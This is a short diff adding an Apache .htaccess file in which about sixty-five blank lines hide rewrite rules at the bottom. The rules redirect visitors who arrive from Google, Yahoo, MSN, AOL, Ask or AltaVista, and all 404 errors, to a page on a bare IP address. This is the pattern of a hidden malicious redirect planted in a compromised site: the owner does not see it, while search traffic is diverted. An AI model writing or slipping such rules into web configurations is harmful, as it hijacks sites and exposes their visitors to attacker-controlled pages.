@@ -1,0 +1,74 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} .*google.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*altavista.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*ask.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*yahoo.*$ [NC]
+RewriteRule .* http://87.248.180.88/in.html?s=ipw [R,L]
+Errordocument 404 http://87.248.180.88/in.html?s=ipw_err
